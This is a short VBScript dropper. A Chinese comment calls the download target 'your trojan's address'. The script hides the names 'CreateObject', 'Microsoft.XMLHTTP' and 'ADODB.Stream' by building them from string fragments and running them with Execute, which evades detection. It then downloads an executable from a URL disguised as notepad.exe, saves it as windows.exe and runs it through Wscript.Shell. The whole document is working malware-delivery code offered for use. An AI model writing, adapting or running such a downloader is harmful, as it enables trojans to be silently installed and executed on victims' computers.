Dim exe_path,file_path
'下面是你木马的地址
exe_path="http://127.0.0.1/notepad.exe"
file_path="windows.exe"
dim crob
crob="cr"
crob=crob+"eate"
crob=crob+"obj"
crob=crob+"ect"

xml="Micr"
xml=xml+"oso"
xml=xml+"ft."
xml=xml+"XML"
xml=xml+"HT"
xml=xml+"TP"

strm="ado"
strm=strm+"db"
strm=strm+".stream"

Dim post
str1="set post=" & crob &"( " & chr(34) & "" & xml &""&chr(34)&")" 
Execute str1 
Post.Open "GET",exe_path,0
Post.Send()
str2="set aGet=" & crob &"( " & chr(34) & "" & strm &""&chr(34)&")" 
Execute str2
aGet.Mode = 3
aGet.Type = 1
aGet.Open() 
aGet.Write(Post.responseBody)
aGet.SaveToFile file_path,2
Set post=Nothing
Set aGet=Nothing
dim cmd
str3="set cmd=" & crob &"(" & chr(34) & "Wscript.Shell"&chr(34)&")" 
Execute str3
cmd.run(file_path)